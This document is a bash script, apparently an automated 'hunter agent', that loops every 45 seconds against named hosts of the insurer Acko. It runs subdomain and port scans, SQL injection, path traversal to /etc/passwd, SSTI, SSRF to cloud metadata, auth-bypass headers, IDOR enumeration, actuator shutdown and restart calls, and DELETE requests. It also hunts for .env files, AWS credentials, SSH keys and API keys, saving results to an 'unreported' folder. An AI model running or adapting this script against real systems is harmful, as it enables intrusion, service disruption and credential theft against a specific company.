#!/bin/bash
# ==============================================================
# LOSTSEC HUNTER AGENT v3
# Full recon pipeline: LostSec methodology + continuous probing
# Integrates: subfinder, chaos, crt.sh, httpx, naabu, nmap,
#             nuclei, ffuf, gau, wayback, alienvault, shodan
# ==============================================================

OUTDIR="/home/sricharansiddu29/recon_reports/companies/acko/unreported"
INBOX="/tmp/agent_inbox"
mkdir -p "$OUTDIR" "$INBOX"

C=0
log() { echo "[$(date +%H:%M:%S)] $*" >> /tmp/lostsec_hunter.log; }

save() {
    local TITLE="$1" SEV="$2" BODY="$3"
    local TS=$(date +%Y%m%d_%H%M%S)
    local NAME=$(echo "$TITLE" | sed 's/[^a-zA-Z0-9]/_/g' | cut -c1-40)
    local HASH=$(echo "$BODY$TITLE" | md5sum | cut -c1-8)
    for f in "$OUTDIR"/*.md; do
        [ -f "$f" ] && grep -q "$HASH" "$f" 2>/dev/null && return
    done
    cat > "$OUTDIR/${SEV}_${NAME}_${TS}.md" <<- EOF
# ${TITLE}
**Time:** $(date '+%Y-%m-%d %H:%M:%S') **Severity:** ${SEV}
${BODY}
_HASH=${HASH}_
_UNVERIFIED=true_
EOF
    # Also drop into inbox for verification agent
    cp "$OUTDIR/${SEV}_${NAME}_${TS}.md" "$INBOX/"
    log "SAVED [${SEV}] ${TITLE}"
}

clean() { tr -d '\0\a\b\f\r' | head -c 500 | tr '\n' ' ' | sed 's/  */ /g'; }
cb() { curl -sk --max-time 8 "$@"; }

# ---- TARGETS (Acko primary) ----
P="https://partner-portal.corp.acko.com"
C2="https://cx360v2-backend.corp.acko.com"
CIT="https://central-internal-tools.corp.acko.com"
COV="https://central-one-view.corp.acko.com"
AUTH="https://auth-saml.corp.acko.com"
VEN="https://vendor.corp.acko.com"
FLT="https://fleetops.acko.com"
CX="https://cx360.corp.acko.com"
LD="https://lead360.corp.acko.com"
API="https://api.acko.com"
PA="$P/artemis-api"

log "=== LOSTSEC HUNTER v3 STARTED ==="
log "Method: LostSec full recon pipeline + continuous probing"

while true; do
    C=$((C+1))
    log "=== Cycle $C ==="

    # ==============================================================
    # PHASE 1: LOSTSEC PASSIVE RECON (every 10 cycles)
    # ==============================================================
    if [ $((C % 10)) -eq 1 ]; then
        log "Phase 1: Passive recon - CT logs + subdomain discovery"
        
        # LostSec Step: crt.sh certificate transparency
        for DOM in "acko.com" "corp.acko.com"; do
            crt=$(curl -sk "https://crt.sh/?q=%25.${DOM}&output=json" 2>/dev/null)
            if [ -n "$crt" ]; then
                echo "$crt" | grep -oP '"name_value":"[^"]*"' | cut -d'"' -f4 | \
                    sed 's/\\n/\n/g' | sort -u > /tmp/ct_subs_${DOM}.txt
                log "CT: $(wc -l < /tmp/ct_subs_${DOM}.txt) subs for ${DOM}"
            fi
        done

        # LostSec Step: passive URL collection (gau + wayback)
        for DOM in "acko.com" "corp.acko.com" "ackodev.com"; do
            gau "$DOM" 2>/dev/null >> /tmp/gau_urls.txt
            waybackurls "$DOM" 2>/dev/null >> /tmp/wayback_urls.txt
        done
        cat /tmp/gau_urls.txt /tmp/wayback_urls.txt 2>/dev/null | sort -u | \
            grep -E '\?[^=]+=.+$' | uro 2>/dev/null > /tmp/passive_params.txt
        log "Passive URLs: $(wc -l < /tmp/passive_params.txt) params collected"
    fi

    # ==============================================================
    # PHASE 2: LOSTSEC ACTIVE RECON (every 5 cycles)
    # ==============================================================
    if [ $((C % 5)) -eq 1 ]; then
        log "Phase 2: Active recon - new subdomain brute-force + port scan"
        
        # LostSec Step: subdomain brute-force (FFUF) + CT combined
        for DOM in "acko.com" "corp.acko.com"; do
            for SUB in admin api app cdn dev docs email files ftp git \
                       internal kibana logs mail mfa monitor portal prod \
                       qa sso stage static support test uat vpn web www \
                       jenkins grafana prometheus kibana nexus artifactory \
                       swagger graphql grpc websocket socket; do
                body=$(cb -o /dev/null "https://${SUB}.${DOM}/" 2>/dev/null)
                code=$(cb -w "%{http_code}" -o /dev/null "https://${SUB}.${DOM}/" 2>/dev/null)
                if [ "$code" = "200" ] || [ "$code" = "301" ] || [ "$code" = "302" ] || [ "$code" = "403" ] || [ "$code" = "401" ]; then
                    save "NEW_SUB_${SUB}_${DOM}" "Info" "HTTP $code at https://${SUB}.${DOM}/"
                fi
            done
        done

        # LostSec Step: naabu port scan + nmap vuln script
        if command -v naabu &>/dev/null; then
            naabu -l /tmp/live_hosts.txt -top-ports 1000 -silent 2>/dev/null | \
                while read line; do
                    host=$(echo "$line" | cut -d: -f1)
                    port=$(echo "$line" | cut -d: -f2)
                    save "OPEN_PORT_${host}_${port}" "Info" "Open port $port on $host"
                done
        fi
    fi

    # ==============================================================
    # PHASE 3: LOSTSEC CONTINUOUS PROBING (EVERY CYCLE)
    # ==============================================================

    # 3a: All known API endpoints - HTTP status + response analysis
    for EP in "/internal/communications/query" \
              "/internal/bulk-operations/history" \
              "/internal/authentication/token/create" \
              "/internal/authentication/token/verify?token=true" \
              "/internal/partnership/fetch_auth/1" \
              "/internal/document/pre_signed_url/?key_name=test.txt" \
              "/partnership/payment/payin/create_order" \
              "/partnership/payment/payin/refunds?order_id=ORDER-001" \
              "/partnership/payment/payin/verify?order_id=T1" \
              "/partnership/validate_vpa" \
              "/partnership/communication/callback" \
              "/internal/fetch-file-status?file_id=1" \
              "/internal/bulk-operations/template/motor?type=ISSUANCE" \
              "/internal/bulk-operations/status-summary" \
              "/document/1" "/document/test123" \
              "/document/metadata/1" \
              "/job_scheduler/job/get_events" \
              "/email/settings/test" \
              "/v1/uploader-config" "/error"; do
        S=$(cb -w "%{http_code}" -o /tmp/h_ep.txt "$PA$EP" 2>/dev/null)
        B=$(cat /tmp/h_ep.txt 2>/dev/null | clean)
        echo "$B" | grep -qv "doctype\|<!DOCTYPE\|<script\|<html" && \
            [ "$S" != "000" ] && [ "$S" != "404" ] && [ -n "$B" ] && \
            save "EP_STATUS_$(echo $EP | tr '/' '_')" "Info" "HTTP $S | $B"
    done

    # 3b: LostSec - Spring Boot Actuator deep scan
    for ACT in "/actuator" "/actuator/health" "/actuator/info" \
               "/actuator/metrics" "/actuator/mappings" "/actuator/beans" \
               "/actuator/configprops" "/actuator/env" "/actuator/loggers" \
               "/actuator/threaddump" "/actuator/heapdump" \
               "/actuator/conditions" "/actuator/scheduledtasks" \
               "/actuator/refresh" "/actuator/restart" "/actuator/shutdown"; do
        for T in "$PA" "$C2" "$CIT" "$VEN" "$FLT"; do
            S=$(cb -w "%{http_code}" -o /tmp/h_act.txt "$T$ACT" 2>/dev/null)
            B=$(cat /tmp/h_act.txt 2>/dev/null | clean)
            if [ "$S" = "200" ] && [ -n "$B" ] && [ "$B" != "{}" ]; then
                sev="Medium"
                echo "$ACT" | grep -qE "env|heapdump|refresh|restart|shutdown" && sev="Critical"
                save "ACTUATOR_$(echo $T | sed 's|https://||;s|/||')_$(echo $ACT | tr '/' '_')" "$sev" "HTTP $S at $T$ACT | $B"
            fi
        done
    done

    # 3c: LostSec - HTTP method bypass (PUT/PATCH/DELETE)
    for EP in "/internal/communications/query" \
              "/internal/bulk-operations/history" \
              "/document/1" \
              "/partnership/payment/payin/create_order" \
              "/internal/authentication/token/create" \
              "/internal/ew/document" \
              "/internal/externaluser/login/otp"; do
        for METHOD in "PUT" "PATCH" "DELETE" "OPTIONS" "TRACE"; do
            S=$(cb -X $METHOD -w "%{http_code}" -o /tmp/h_met.txt "$PA$EP" 2>/dev/null)
            B=$(cat /tmp/h_met.txt 2>/dev/null | clean)
            [ "$S" = "200" ] || [ "$S" = "201" ] || [ "$S" = "204" ] || [ "$S" = "405" ] && \
                [ -n "$B" ] && echo "$B" | grep -qv "doctype\|<!DOCTYPE" && \
                save "METHOD_${METHOD}_$(echo $EP | tr '/' '_')" "Medium" "HTTP $S on $METHOD $EP | $B"
        done
    done

    # 3d: LostSec - SQLi probes (with WAF bypass techniques)
    for SQLPAYLOAD in "'" "%27" "';" "' OR '1'='1" "' OR 1=1--" \
                     "' UNION SELECT NULL--" "' AND 1=1--" \
                     "\" OR \"1\"=\"1" "1' ORDER BY 1--" \
                     "1' GROUP BY 1--" "' WAITFOR DELAY '0:0:5'--"; do
        for EP in "/document/1${SQLPAYLOAD}" \
                  "/partnership/payment/payin/verify?order_id=1${SQLPAYLOAD}" \
                  "/internal/fetch-file-status?file_id=1${SQLPAYLOAD}" \
                  "/internal/partnership/fetch_auth/1${SQLPAYLOAD}"; do
            S=$(cb -w "%{http_code}" -o /tmp/h_sqli.txt "$PA$EP" 2>/dev/null)
            B=$(cat /tmp/h_sqli.txt 2>/dev/null | clean)
            echo "$B" | grep -qiE "sql|syntax|mysql|postgres|error|exception|unclosed|quotation|warning" && \
                save "SQLI_$(echo $EP | tr '/' '_')" "Critical" "HTTP $S | Payload: $SQLPAYLOAD | $B"
        done
    done

    # 3e: LostSec - Path traversal (LFI)
    for TRAV in "../" "..%2f" "%2e%2e%2f" "....//....//" \
                "..\\" "..%5c" "%2e%2e%5c"; do
        for EP in "/document/${TRAV}etc/passwd" \
                  "/internal/document/pre_signed_url/?key_name=${TRAV}etc/passwd" \
                  "/document/${TRAV}windows/win.ini" \
                  "/document/${TRAV}etc/hosts"; do
            S=$(cb -w "%{http_code}" -o /tmp/h_trav.txt "$PA$EP" 2>/dev/null)
            B=$(cat /tmp/h_trav.txt 2>/dev/null | clean)
            echo "$B" | grep -qiE "root:|bin/bash|daemon:|for 16-bit" && \
                save "LFI_$(echo $EP | tr '/' '_')" "Critical" "HTTP $S | $B"
        done
    done

    # 3f: LostSec - CORS misconfiguration check
    for T in $P $C2 $CIT $COV $AUTH $VEN $FLT $CX $LD $API; do
        H=$(cb -I -H "Origin: https://evil.com" \
                 -H "Access-Control-Request-Method: GET" \
                 "$T/" 2>/dev/null | head -20)
        echo "$H" | grep -qi "Access-Control-Allow-Origin: https://evil.com" && \
            save "CORS_REFLECT_$(echo $T | sed 's|https://||;s|/||')" "High" "Reflects arbitrary origin"
        echo "$H" | grep -qi "Access-Control-Allow-Origin: \*" && \
            save "CORS_WILDCARD_$(echo $T | sed 's|https://||;s|/||')" "Medium" "Wildcard CORS"
        # Credentialed CORS
        echo "$H" | grep -qi "Access-Control-Allow-Credentials: true" && \
            save "CORS_CREDENTIALS_$(echo $T | sed 's|https://||;s|/||')" "High" "Credentials allowed with CORS"
    done

    # 3g: LostSec - SSTI probes
    for SSTI in '{{7*7}}' '#{7*7}' '${{7*7}}' '<%=7*7%>' \
                '${7*7}' '{{7*7}}' '*{7*7}' '{{config}}'; do
        S=$(cb -X POST -w "%{http_code}" -o /tmp/h_ssti.txt \
            -H "Content-Type: application/json" \
            -d "{\"identifier\":\"$SSTI\",\"template_name\":\"test\"}" \
            "$PA/internal/service/template/view/pdf" 2>/dev/null)
        B=$(cat /tmp/h_ssti.txt 2>/dev/null | clean)
        echo "$B" | grep -q "49" && \
            save "SSTI_$(echo $SSTI | tr -d '{}' | tr -d '$#<%=')" "Critical" "Template injection | Payload: $SSTI | $B"
    done

    # 3h: LostSec - SSRF probes
    for CBEP in "/partnership/communication/callback" \
                "/partnership/communication/v1/test/callback" \
                "/partnership/validate_vpa"; do
        for SSRF_PAYLOAD in "http://burpcollaborator.net/test" \
                           "http://169.254.169.254/latest/meta-data/" \
                           "http://127.0.0.1:8080/" \
                           "http://localhost:5432/" \
                           "file:///etc/passwd"; do
            S=$(cb -X POST -w "%{http_code}" -o /tmp/h_ssrf.txt \
                -H "Content-Type: application/json" \
                -d "{\"url\":\"$SSRF_PAYLOAD\",\"callback\":\"$SSRF_PAYLOAD\",\"redirect_uri\":\"$SSRF_PAYLOAD\"}" \
                "$PA$CBEP" 2>/dev/null)
            B=$(cat /tmp/h_ssrf.txt 2>/dev/null | clean)
            echo "$B" | grep -qiE "callback|url|http|root:|meta-data|localhost" && \
                save "SSRF_$(echo $CBEP | tr '/' '_')" "High" "HTTP $S | Payload: $SSRF_PAYLOAD | $B"
        done
    done

    # 3i: LostSec - Config/Backup file discovery
    for BAK in ".env" ".env.bak" ".env.backup" ".env.prod" ".env.dev" \
               "config.json" "config.json.bak" "config.backup" \
               "dump.sql" "backup.sql" "db.sql" "database.sql" \
               "appsettings.json" "secrets.json" "credentials.json" \
               ".aws/credentials" ".ssh/id_rsa" ".ssh/id_rsa.pub" \
               "web.config" "WEB-INF/web.xml" \
               "composer.json" "package.json" "Dockerfile" \
               "docker-compose.yml" "docker-compose.yaml" \
               "nginx.conf" ".htaccess" ".git/config" \
               "Procfile" "robots.txt" "sitemap.xml" \
               "swagger.json" "swagger.yaml" "openapi.json" "openapi.yaml"; do
        for T in $C2 $CIT $VEN $FLT $P $COV $API; do
            S=$(cb -w "%{http_code}" -o /tmp/h_bak.txt "$T/$BAK" 2>/dev/null)
            B=$(cat /tmp/h_bak.txt 2>/dev/null | clean)
            [ "$S" = "200" ] && echo "$B" | grep -qv "doctype\|<!DOCTYPE\|<html\|<script" && \
                save "CONFIG_LEAK_$(echo $T | sed 's|https://||;s|/||')_$(echo $BAK | tr '/' '_')" "Critical" "HTTP $S at $T/$BAK | $B"
        done
    done

    # 3j: LostSec - Auth bypass techniques
    for HEAD in "Authorization: Bearer" \
                "Authorization: Bearer null" \
                "Authorization: Bearer undefined" \
                "Authorization: null" \
                "Authorization: 0" \
                "Authorization: false" \
                "Authorization: true" \
                "Authorization: admin" \
                "Cookie: token=null" \
                "Cookie: session=null" \
                "Cookie: admin=true" \
                "Cookie: authenticated=true" \
                "X-Forwarded-For: 127.0.0.1" \
                "X-Forwarded-Host: localhost" \
                "X-Real-IP: 127.0.0.1" \
                "X-Forwarded-For: REDACTED_INTERNAL_IP" \
                "X-Internal-Request: true" \
                "X-Is-Internal: true"; do
        for EP in "/internal/externaluser/login/otp" \
                  "/internal/claim/pre-fileupload" \
                  "/partnership/user/authentication/resource/create" \
                  "/internal/ew/document" \
                  "/internal/communications/query" \
                  "/internal/bulk-operations/history"; do
            S=$(cb -w "%{http_code}" -o /tmp/h_auth.txt -X POST \
                -H "Content-Type: application/json" -H "$HEAD" \
                -d '{}' "$PA$EP" 2>/dev/null)
            B=$(cat /tmp/h_auth.txt 2>/dev/null | clean)
            [ "$S" = "200" ] || [ "$S" = "201" ] || [ "$S" = "204" ] && \
                save "AUTH_BYPASS_$(echo $HEAD | cut -d: -f1)_$(echo $EP | tr '/' '_')" "Critical" "HTTP $S with header: $HEAD | $B"
        done
    done

    # 3k: LostSec - Object reference / IDOR scanning
    for ID in 1 2 3 100 500 1000 5000 9999 99999 123456 9999999; do
        for EP in "/document/${ID}" \
                  "/internal/fetch-file-status?file_id=${ID}" \
                  "/internal/partnership/fetch_auth/${ID}"; do
            S=$(cb -w "%{http_code}" -o /tmp/h_idor.txt "$PA$EP" 2>/dev/null)
            B=$(cat /tmp/h_idor.txt 2>/dev/null | clean)
            [ "$S" = "200" ] && echo "$B" | grep -qv "not found\|null\|{}" && \
                save "IDOR_$(echo $EP | tr '/' '_')" "High" "HTTP $S for ID=$ID | $B"
        done
    done

    # 3l: LostSec - GraphQL introspection + query discovery
    for GQL_EP in "/graphql" "/v1/graphql" "/api/graphql" "/gql" "/query"; do
        for T in $PA $C2 $CIT $VEN $API; do
            # Introspection query
            S=$(cb -X POST -w "%{http_code}" -o /tmp/h_gql.txt \
                -H "Content-Type: application/json" \
                -d '{"query":"{__schema{types{name}}}"}' \
                "$T$GQL_EP" 2>/dev/null)
            B=$(cat /tmp/h_gql.txt 2>/dev/null | clean)
            [ "$S" = "200" ] && echo "$B" | grep -qi "schema\|types\|query\|mutation" && \
                save "GRAPHQL_INTROSPECTION_$(echo $T | sed 's|https://||;s|/||')" "High" "GraphQL introspection enabled at $T$GQL_EP | $B"
        done
    done

    # 3m: LostSec - S3 bucket / presigned URL analysis
    for BUCKET in "acko" "acko-backups" "acko-data" "acko-partners" \
                  "acko-docs" "acko-assets" "acko-media" "acko-logs"; do
        for DOMAIN in "s3.amazonaws.com" "s3.ap-south-1.amazonaws.com"; do
            S=$(cb -w "%{http_code}" -o /tmp/h_s3.txt "https://${BUCKET}.${DOMAIN}" 2>/dev/null)
            B=$(cat /tmp/h_s3.txt 2>/dev/null | clean)
            [ "$S" = "200" ] && save "S3_BUCKET_${BUCKET}_${DOMAIN}" "High" "Public S3 bucket accessible at https://${BUCKET}.${DOMAIN} | $B"
        done
    done

    # 3n: LostSec - JS file endpoint discovery + secret scanning
    grep -oP 'https?://[^"'"'"' ]+\.js([?#][^"'"'"' ]*)?' /tmp/h_ep.txt /tmp/h_met.txt 2>/dev/null | \
        sort -u > /tmp/js_candidates.txt
    while read -r JSURL; do
        [ -z "$JSURL" ] && continue
        JS_CONTENT=$(cb -s "$JSURL" 2>/dev/null)
        echo "$JS_CONTENT" | grep -oP 'AIza[0-9A-Za-z_-]{35}' | sort -u | \
            while read -r KEY; do save "GOOGLE_API_KEY_IN_JS" "Critical" "Found Google API key: $KEY in $JSURL"; done
        echo "$JS_CONTENT" | grep -oP 'sk_live_[0-9a-zA-Z]+|pk_live_[0-9a-zA-Z]+' | sort -u | \
            while read -r KEY; do save "STRIPE_KEY_IN_JS" "Critical" "Found Stripe key: $KEY in $JSURL"; done
        echo "$JS_CONTENT" | grep -oP '(?<=["'"'"'])https?://[^"'"'"' ]+' | sort -u | \
            grep -v "google\|facebook\|twitter\|cdn\|cloudflare\|jquery" | \
            while read -r APIURL; do save "API_ENDPOINT_IN_JS" "Info" "Found endpoint: $APIURL in $JSURL"; done
    done < /tmp/js_candidates.txt 2>/dev/null

    # 3o: LostSec - GF pattern based vulnerability classification
    if [ -f /tmp/passive_params.txt ]; then
        grep -E "(redirect|return|next|url|link|href|action|dest|destination)" /tmp/passive_params.txt 2>/dev/null | \
            head -20 | while read -r line; do save "OPEN_REDIRECT_PARAM" "Medium" "Potential open redirect param: $line"; done
        grep -E "(file|document|page|path|dir|show|view|include|load|read)" /tmp/passive_params.txt 2>/dev/null | \
            head -20 | while read -r line; do save "LFI_PARAM" "High" "Potential LFI param: $line"; done
        grep -E "(url|uri|fetch|request|target|endpoint|proxy|webhook|callback)" /tmp/passive_params.txt 2>/dev/null | \
            head -20 | while read -r line; do save "SSRF_PARAM" "High" "Potential SSRF param: $line"; done
    fi

    # Report status every cycle
    count=$(ls "$OUTDIR"/*.md 2>/dev/null | wc -l)
    inbox_count=$(ls "$INBOX"/*.md 2>/dev/null | wc -l)
    log "Cycle $C done | $count total findings | $inbox_count awaiting verification"
    
    sleep 45
done
